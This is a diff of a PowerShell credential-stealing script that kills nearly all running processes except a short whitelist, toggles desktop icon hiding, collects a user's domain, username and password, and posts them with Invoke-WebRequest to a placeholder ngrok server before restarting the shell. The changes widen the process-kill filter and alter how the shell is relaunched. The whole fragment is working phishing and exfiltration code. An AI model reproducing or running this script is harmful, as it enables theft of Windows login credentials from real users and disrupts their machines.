@@ -1,6 +1,7 @@
 ﻿
-REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f
-taskkill /f /fi "IMAGENAME ne sihost.exe"
+#REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f
+
+taskkill /f /fi "IMAGENAME ne sihost.exe" /fi "IMAGENAME ne powershell.exe" /fi "IMAGENAME ne svchost.exe" /fi "IMAGENAME ne dllhost.exe" /fi "IMAGENAME ne conhost.exe" /fi "IMAGENAME ne RuntimeBroker.exe"
 
 
 $ngrokServer = 'ngrok_link/index.php'
@@ -33,7 +34,7 @@ while ( $cnt -lt '1000000000' ) {
             $username = "Username: ";
 	    Invoke-WebRequest -Uri $ngrokServer -Method POST -Body $username$domain"\"$user" `nPassword: "$pass"`n" -ErrorAction Ignore
             REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 0 /f
-            start explorer.exe
+            powershell /c start sihost.exe
 	    exit
         
 	}
